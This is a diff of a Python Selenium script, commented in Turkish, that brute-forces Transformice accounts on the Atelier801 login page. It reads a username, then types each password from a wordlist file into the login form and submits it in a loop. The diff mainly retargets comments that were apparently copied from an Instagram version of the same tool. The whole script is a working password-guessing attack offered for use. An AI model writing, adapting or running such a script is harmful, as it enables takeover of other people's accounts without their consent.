@@ -11,7 +11,7 @@ name = input("Transformice Adı: ")
 
 
 driver= webdriver.Chrome()
-driver.get("https://atelier801.com/login?redirect=https%3A%2F%2Fatelier801.com%2Findex") # Instagram giriş sayfasına yönlendir.
+driver.get("https://atelier801.com/login?redirect=https%3A%2F%2Fatelier801.com%2Findex") # Ateiler801 giriş sayfasına yönlendirir.
 time.sleep(3)
 
 correctUrl = "https://atelier801.com/index"
@@ -20,10 +20,10 @@ password = driver.find_element(By.ID, 'auth_pass_1')
 giris = driver.find_element(By.XPATH, "/html/body/div[2]/div[5]/div[3]/div/form[1]/fieldset/div[4]/button")
 
 
-dosya = open("wordlist.txt", "r") # Şifrelerin kaydedildiği wordlist dosyamızı açtık.
+dosya = open("sifre.txt", "r") # Şifrelerin kaydedildiği wordlist dosyamızı açtık.
 
 for satir in dosya:
-    username.send_keys(name) # Instagram kullanıcı adı knk.
+    username.send_keys(name) # Transformice kullanıcı adı knk.
     password.send_keys(satir) # WordList'teki şifreler. Tek tek denenecek.
     giris.click() # Giriş yap butonuna tıklama komutu knk.
     time.sleep(15) # Şifreler denendikten sonra 3 saniye bekle.
@@ -44,4 +44,4 @@ for satir in dosya:
     
 
 
-time.sleep(1000) # 10 Saniye bekleyelim.
+time.sleep(1000) 
